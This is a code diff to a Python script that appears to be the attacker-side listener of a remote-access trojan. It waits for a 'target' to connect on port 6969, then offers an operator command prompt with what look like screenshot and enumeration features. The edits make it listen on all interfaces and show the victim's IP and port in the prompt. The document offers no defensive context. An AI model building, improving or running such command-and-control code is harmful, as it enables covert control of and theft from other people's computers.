@@ -3,7 +3,7 @@
 
 import base64,json,socket,sys
 from Crypto.Cipher import AES
-ip='192.168.56.1' # can use noip dns
+ip='0.0.0.0' # can use noip dns
 print (ip)
 port = 6969
 
@@ -68,6 +68,7 @@ class listener:
         listener.bind((ip, port))
         listener.listen(3)
         print cyan,"[*] waiting for connection...",r
+        global addr
         self.conn, addr = listener.accept()
         print green,"target ", str(addr), "is on...",r
 
@@ -126,7 +127,7 @@ class listener:
         shot_count = 1
         enum_count = 1
         while True:
-            cmd = raw_input(str(ip)+" >> ")
+            cmd = raw_input(str(addr[0])+':'+str(addr[1])+" >> ")
             cmd=cmd.split(" ")
             try:
                 if cmd[0] == "help":
